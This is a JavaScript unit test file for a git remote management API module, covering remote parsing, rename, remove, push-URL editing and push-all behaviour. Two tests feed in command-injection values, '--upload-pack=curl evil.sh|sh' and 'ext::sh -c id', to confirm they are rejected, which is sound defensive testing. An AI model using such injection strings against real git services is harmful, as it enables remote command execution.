// remotes.js 单元测试
// 模式参照 aiDiffSummary.test.js:node:test + 假 app 捕获 handler + mock execGitCommand
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { registerGitRemoteRoutes, __testables } from './remotes.js';

const { parseRemoteVerbose, buildPushRefs } = __testables;

// ── 测试工具 ─────────────────────────────────────────────────────────────

function makeApp() {
  const handlers = {};
  const app = {
    get(path, ...hs) { handlers[`GET ${path}`] = hs.at(-1); },
    post(path, ...hs) { handlers[`POST ${path}`] = hs.at(-1); }
  };
  return { app, handlers };
}

async function invoke(handler, body = {}) {
  let statusCode = 200;
  let payload;
  const req = { body, method: 'POST', path: '/test' };
  const res = {
    status(code) { statusCode = code; return this; },
    json(data) { payload = data; return this; }
  };
  await handler(req, res, () => {});
  return { statusCode, payload };
}

// 构造 mock execGitCommand:handlers 为 [匹配前缀, 返回值或函数] 列表,
// 函数形式可抛错模拟命令失败;未匹配的命令返回 { stdout: '' }。
function mockGit(routes = []) {
  const calls = [];
  const exec = async (args, opts = {}) => {
    calls.push({ args, opts });
    const key = args.join(' ');
    for (const [prefix, value] of routes) {
      if (key.startsWith(prefix)) {
        const v = typeof value === 'function' ? value(args, opts) : value;
        if (v instanceof Error) throw v;
        return v;
      }
    }
    return { stdout: '' };
  };
  return { exec, calls };
}

// 常见仓库上下文:origin(fetch/push 同地址) + gitee,上游 origin/main,当前分支 main
const STANDARD_CONTEXT = [
  ['remote -v', {
    stdout: 'origin\tgit@github.com:a/b.git (fetch)\n' +
      'origin\tgit@github.com:a/b.git (push)\n' +
      'gitee\tgit@gitee.com:a/b.git (fetch)\n' +
      'gitee\tgit@gitee.com:a/b.git (push)\n'
  }],
  ['rev-parse --abbrev-ref @{u}', { stdout: 'origin/main\n' }],
  ['symbolic-ref --short HEAD', { stdout: 'main\n' }],
  ['rev-parse --verify HEAD', { stdout: 'abc123\n' }]
];

function registerRoutes(execGitCommand, extra = {}) {
  const { app, handlers } = makeApp();
  registerGitRemoteRoutes({ app, execGitCommand, setRecentPushStatus: extra.setRecentPushStatus });
  return handlers;
}

// ── parseRemoteVerbose ──────────────────────────────────────────────────

test('parseRemoteVerbose: 单 remote fetch/push 同地址', () => {
  const out = 'origin\tgit@github.com:a/b.git (fetch)\norigin\tgit@github.com:a/b.git (push)\n';
  assert.deepEqual(parseRemoteVerbose(out), [
    { name: 'origin', fetchUrl: 'git@github.com:a/b.git', pushUrls: ['git@github.com:a/b.git'] }
  ]);
});

test('parseRemoteVerbose: 多 push URL 全部收集并去重', () => {
  const out = 'origin\tgit@github.com:a/b.git (fetch)\n' +
    'origin\tgit@github.com:a/b.git (push)\n' +
    'origin\tgit@gitee.com:a/b.git (push)\n' +
    'origin\tgit@gitee.com:a/b.git (push)\n';
  assert.deepEqual(parseRemoteVerbose(out)[0].pushUrls, [
    'git@github.com:a/b.git',
    'git@gitee.com:a/b.git'
  ]);
});

test('parseRemoteVerbose: 本地路径含空格的 URL 完整保留', () => {
  const out = 'backup\t/c/My Repos/foo.git (fetch)\nbackup\t/c/My Repos/foo.git (push)\n';
  assert.equal(parseRemoteVerbose(out)[0].fetchUrl, '/c/My Repos/foo.git');
});

test('parseRemoteVerbose: 空输出返回空数组', () => {
  assert.deepEqual(parseRemoteVerbose(''), []);
  assert.deepEqual(parseRemoteVerbose(undefined), []);
});

// ── buildPushRefs ───────────────────────────────────────────────────────

test('buildPushRefs: 不传 remote 返回空数组(裸 push)', () => {
  assert.deepEqual(buildPushRefs({ remote: '', currentBranch: 'main', upstreamBranch: 'origin/main' }), []);
});

test('buildPushRefs: 上游就是目标 remote 时返回空数组(按实际上游映射推)', () => {
  assert.deepEqual(buildPushRefs({ remote: 'origin', currentBranch: 'main', upstreamBranch: 'origin/main' }), []);
});

test('buildPushRefs: 目标 remote 与上游不同,推 HEAD 到同名分支', () => {
  assert.deepEqual(buildPushRefs({ remote: 'gitee', currentBranch: 'main', upstreamBranch: 'origin/main' }), [
    'gitee',
    'HEAD:main'
  ]);
});

test('buildPushRefs: 无上游时推 HEAD 到同名分支', () => {
  assert.deepEqual(buildPushRefs({ remote: 'origin', currentBranch: 'feat', upstreamBranch: '' }), [
    'origin',
    'HEAD:feat'
  ]);
});

test('buildPushRefs: detached HEAD 带 remote 推送抛 400', () => {
  assert.throws(
    () => buildPushRefs({ remote: 'origin', currentBranch: '', upstreamBranch: '' }),
    (e) => e.statusCode === 400
  );
});

// ── GET /api/remotes ────────────────────────────────────────────────────

test('GET /api/remotes: 上游与 pushDefault 标记正确', async () => {
  const { exec } = mockGit([
    ...STANDARD_CONTEXT,
    ['config --get remote.pushDefault', { stdout: 'gitee\n' }]
  ]);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['GET /api/remotes']);

  assert.equal(payload.success, true);
  assert.equal(payload.currentBranch, 'main');
  assert.equal(payload.upstreamBranch, 'origin/main');
  assert.equal(payload.pushDefault, 'gitee');
  const origin = payload.remotes.find(r => r.name === 'origin');
  const gitee = payload.remotes.find(r => r.name === 'gitee');
  assert.equal(origin.isUpstream, true);
  assert.equal(origin.isPushDefault, false);
  assert.equal(gitee.isUpstream, false);
  assert.equal(gitee.isPushDefault, true);
  assert.equal(origin.hasExplicitPushUrls, false);
});

test('GET /api/remotes: 显式 pushurl 覆盖 pushUrls 并标记 hasExplicitPushUrls', async () => {
  const { exec } = mockGit([
    ...STANDARD_CONTEXT,
    ['config --get-all remote.origin.pushurl', { stdout: 'git@github.com:a/b.git\ngit@gitee.com:a/b.git\n' }]
  ]);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['GET /api/remotes']);

  const origin = payload.remotes.find(r => r.name === 'origin');
  assert.equal(origin.hasExplicitPushUrls, true);
  assert.deepEqual(origin.pushUrls, ['git@github.com:a/b.git', 'git@gitee.com:a/b.git']);
});

test('GET /api/remotes: 上游指向本地分支时所有 remote isUpstream=false', async () => {
  const { exec } = mockGit([
    ['remote -v', { stdout: 'origin\tgit@github.com:a/b.git (fetch)\norigin\tgit@github.com:a/b.git (push)\n' }],
    ['rev-parse --abbrev-ref @{u}', { stdout: 'main\n' }],
    ['symbolic-ref --short HEAD', { stdout: 'feat\n' }]
  ]);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['GET /api/remotes']);
  assert.equal(payload.remotes[0].isUpstream, false);
});

// ── POST /api/remote/rename ─────────────────────────────────────────────

test('rename: newName 已存在返回 400 且不执行 git 写命令', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { statusCode, payload } = await invoke(handlers['POST /api/remote/rename'], {
    oldName: 'origin',
    newName: 'gitee'
  });
  assert.equal(statusCode, 400);
  assert.match(payload.error, /已存在/);
  assert.equal(calls.some(c => c.args[0] === 'remote' && c.args[1] === 'rename'), false);
});

test('rename: oldName 不存在返回 400', async () => {
  const { exec } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { statusCode, payload } = await invoke(handlers['POST /api/remote/rename'], {
    oldName: 'nosuch',
    newName: 'x'
  });
  assert.equal(statusCode, 400);
  assert.match(payload.error, /不存在/);
});

test('rename: 成功路径执行 git remote rename 并回传 wasUpstream', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['POST /api/remote/rename'], {
    oldName: 'origin',
    newName: 'github'
  });
  assert.equal(payload.success, true);
  assert.equal(payload.wasUpstream, true);
  assert.ok(calls.some(c => c.args.join(' ') === 'remote rename origin github'));
});

test('rename: 注入形式的 remote 名被 400 拦截', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { statusCode } = await invoke(handlers['POST /api/remote/rename'], {
    oldName: '--upload-pack=curl evil.sh|sh',
    newName: 'x'
  });
  assert.equal(statusCode, 400);
  assert.equal(calls.some(c => c.args[0] === 'remote' && c.args[1] === 'rename'), false);
});

// ── POST /api/remote/remove ─────────────────────────────────────────────

test('remove: 删除上游指向的 remote 后追加 unset-upstream', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['POST /api/remote/remove'], { name: 'origin' });
  assert.equal(payload.success, true);
  assert.equal(payload.wasUpstream, true);
  assert.ok(calls.some(c => c.args.join(' ') === 'remote remove origin'));
  assert.ok(calls.some(c => c.args.join(' ') === 'branch --unset-upstream main'));
});

test('remove: 删除非上游 remote 不执行 unset-upstream', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['POST /api/remote/remove'], { name: 'gitee' });
  assert.equal(payload.wasUpstream, false);
  assert.equal(calls.some(c => c.args[0] === 'branch' && c.args[1] === '--unset-upstream'), false);
});

// ── POST /api/remote/push-urls ──────────────────────────────────────────

test('push-urls: 先 unset-all 再逐条 --add,顺序保持', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['POST /api/remote/push-urls'], {
    name: 'origin',
    pushUrls: ['git@github.com:a/b.git', 'git@gitee.com:a/b.git']
  });
  assert.equal(payload.success, true);

  const writeCalls = calls.filter(c =>
    (c.args[0] === 'config' && c.args[1] === '--unset-all') ||
    (c.args[0] === 'remote' && c.args[1] === 'set-url')
  );
  assert.equal(writeCalls[0].args.join(' '), 'config --unset-all remote.origin.pushurl');
  // unset-all 必须带 ignoreError(无 pushurl 时退出码 5 属预期)
  assert.equal(writeCalls[0].opts.ignoreError, true);
  assert.equal(writeCalls[1].args.join(' '), 'remote set-url --push --add origin git@github.com:a/b.git');
  assert.equal(writeCalls[2].args.join(' '), 'remote set-url --push --add origin git@gitee.com:a/b.git');
});

test('push-urls: 空数组只做 unset-all(回落 fetch URL)', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { payload } = await invoke(handlers['POST /api/remote/push-urls'], {
    name: 'origin',
    pushUrls: []
  });
  assert.equal(payload.success, true);
  assert.equal(calls.some(c => c.args[0] === 'remote' && c.args[1] === 'set-url'), false);
  assert.ok(calls.some(c => c.args.join(' ') === 'config --unset-all remote.origin.pushurl'));
});

test('push-urls: 含非法 URL 时 400 且不执行任何写命令', async () => {
  const { exec, calls } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec);
  const { statusCode } = await invoke(handlers['POST /api/remote/push-urls'], {
    name: 'origin',
    pushUrls: ['git@github.com:a/b.git', 'ext::sh -c id']
  });
  assert.equal(statusCode, 400);
  assert.equal(calls.some(c => c.args[1] === '--unset-all'), false);
  assert.equal(calls.some(c => c.args[0] === 'remote' && c.args[1] === 'set-url'), false);
});

// ── POST /api/push-all-remotes ──────────────────────────────────────────

test('push-all: 无 remote 返回 400 NO_REMOTES', async () => {
  const { exec } = mockGit([
    ['symbolic-ref --short HEAD', { stdout: 'main\n' }]
  ]);
  const handlers = registerRoutes(exec);
  const { statusCode, payload } = await invoke(handlers['POST /api/push-all-remotes']);
  assert.equal(statusCode, 400);
  assert.equal(payload.errorCode, 'NO_REMOTES');
});

test('push-all: 空仓库返回 400 EMPTY_REPO', async () => {
  const { exec } = mockGit([
    ['remote -v', { stdout: 'origin\tgit@github.com:a/b.git (fetch)\norigin\tgit@github.com:a/b.git (push)\n' }],
    ['symbolic-ref --short HEAD', { stdout: 'main\n' }],
    ['rev-parse --verify HEAD', { stdout: '' }]
  ]);
  const handlers = registerRoutes(exec);
  const { statusCode, payload } = await invoke(handlers['POST /api/push-all-remotes']);
  assert.equal(statusCode, 400);
  assert.equal(payload.errorCode, 'EMPTY_REPO');
});

test('push-all: 单个失败不中断,结果逐条聚合,不设推送标记', async () => {
  let pushStatusSet = false;
  const { exec, calls } = mockGit([
    ...STANDARD_CONTEXT,
    ['push gitee', () => new Error('Permission denied (publickey)')]
  ]);
  const handlers = registerRoutes(exec, { setRecentPushStatus: () => { pushStatusSet = true; } });
  const { payload } = await invoke(handlers['POST /api/push-all-remotes']);

  assert.equal(payload.success, false);
  assert.deepEqual(payload.results, [
    { name: 'origin', ok: true },
    { name: 'gitee', ok: false, error: 'Permission denied (publickey)' }
  ]);
  // origin 上游同源 → 裸 push;gitee → 带 refspec
  assert.ok(calls.some(c => c.args.join(' ') === 'push'));
  assert.ok(calls.some(c => c.args.join(' ') === 'push gitee HEAD:main'));
  assert.equal(pushStatusSet, false);
});

test('push-all: 全部成功时设置推送状态标记', async () => {
  let pushStatusSet = false;
  const { exec } = mockGit(STANDARD_CONTEXT);
  const handlers = registerRoutes(exec, { setRecentPushStatus: () => { pushStatusSet = true; } });
  const { payload } = await invoke(handlers['POST /api/push-all-remotes']);
  assert.equal(payload.success, true);
  assert.equal(payload.results.every(r => r.ok), true);
  assert.equal(pushStatusSet, true);
});
